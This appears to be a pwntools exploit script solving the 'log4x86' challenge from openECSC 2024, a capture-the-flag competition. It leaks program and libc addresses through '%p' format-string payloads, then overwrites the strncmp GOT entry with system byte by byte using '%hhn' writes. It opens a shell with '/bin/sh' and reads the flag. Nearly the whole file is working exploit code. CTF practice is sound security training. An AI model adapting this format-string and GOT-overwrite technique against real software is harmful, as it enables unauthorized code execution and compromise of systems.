#!/usr/bin/env python3
"""
file: pwn_template.py
author: Fabio Zoratti @orsobruno96 <fabio.zoratti96@gmail.com>

"""
import os
import logging
from pathlib import Path

from pwn import (
    ELF, context, args, remote, process, log, cyclic, ui,
)

logging.disable()

HOST = os.environ.get("HOST", "log4x86.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38019))

elf_name = "logloglog_patched"

gdbscript = """
"""
exe = context.binary = ELF(os.path.join(os.path.dirname(__file__), elf_name))
remotehost = (HOST, PORT)
libc = ELF(os.path.join(os.path.dirname(__file__), 'libc.so.6'))

def start(argv=[], *a, **kw):
    if args.GDB:
        SCRIPTNAME = "gdbscript.txt"
        with open(SCRIPTNAME, "w") as outfile:
            outfile.write(gdbscript)

        io = process([exe.path] + argv, *a, **kw)
        os.system(f"tmux split-window -h -f -c {Path(exe.path).parent} sh -c 'gdb -p {io.pid} -x {SCRIPTNAME} && fish'")
        return io
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    return remote(*remotehost, *a, **kw)


def send_command(io, command: bytes):
    io.sendlineafter(b"> ", command)


def main():
    io = start()
    if args.GDB:
        ui.pause()
    send_command(io, b"change_log_format")
    io.sendline(b"%.260f")
    send_command(io, b"change_log_level info")
    send_command(io, b"change_log_level info" + b" %p" * 50)
    addresses = [
        int(val, 16) if val != "(nil)" else 0 for val in io.recvuntil(b"> ").decode().split()[2:-1]
    ]
    for i, addr in enumerate(addresses):
        log.info(f"Leaked {i:03d}: {addr:#018x}")
    io.unread(b"> ")

    exe.address = addresses[0] - 0x201c
    log.success(f"Leaked {exe.address = :#018x}")
    libc.address = addresses[36] - libc.libc_start_main_return
    log.success(f"Leaked {libc.address = :#018x}")
    # stack_address = addresses[16]

    for i in range(6):
        where = exe.got['strncmp'] + i
        what = (libc.sym['system'] >> (8 * i)) & 0xff
        log.info(f"Writing {what:#x} to {where:#x}")
        low = where >> 32
        hi = where & ((1 << 32) - 1)
        partial = f"change_log_level info {hi:d} {low:d} ".encode()
        MISSING = 7
        towrite = (what + 256 - len(partial) - MISSING) % 256
        partial += b"%c" * MISSING + cyclic(towrite) + b"%hhn"
        send_command(io, partial)

    send_command(io, b"/bin/sh")
    io.sendline(b"cat flag")
    io.recvuntil(b"openECSC{")
    io.unrecv(b"openECSC{")
    flag = io.recvuntil(b"}").decode()
    print(flag)
    io.close()


if __name__ == '__main__':
    main()
